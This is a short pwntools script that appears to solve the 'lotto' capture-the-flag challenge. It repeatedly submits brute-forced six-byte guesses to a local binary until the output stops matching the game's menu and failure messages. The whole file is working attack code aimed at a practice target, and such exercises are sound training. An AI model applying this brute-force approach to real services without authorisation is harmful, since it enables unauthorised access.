from pwn import *
import codecs


def dec_ascii(n):
        hx = hex(n)[2:]
        if len(hx) == 1:
                hx = '0'+hx
        return codecs.decode(hx, 'hex')

def found_flag(output):
        return 'bad luck...' not in output and\
                '- Select Menu -' not in output and\
                '1. Play Lotto' not in output and\
                '2. Help' not in output and\
                '3. Exit' not in output and\
                'Submit your 6 lotto bytes : ' not in output and\
                'Lotto Start!' not in output

def main():
        context(arch='i386', os='linux')

        r = process('/home/lotto/lotto')
        n = 45
        for a in range(1,n+1):
                for b in range(1,n+1):
                        for c in range(1,n+1):
                                for d in range(1,n+1):
                                        for e in range(1,n+1):
                                                for f in range(1,n+1):
                                                        lotto = dec_ascii(a)+\
                                                                dec_ascii(b)+\
                                                                dec_ascii(c)+\
                                                                dec_ascii(d)+\
                                                                dec_ascii(e)+\
                                                                dec_ascii(f)
                                                        r.send('1')
                                                        r.send(lotto)
                                                        output = r.recvline()
                                                        print(output)
                                                        if found_flag(output):
                                                                exit()

main()
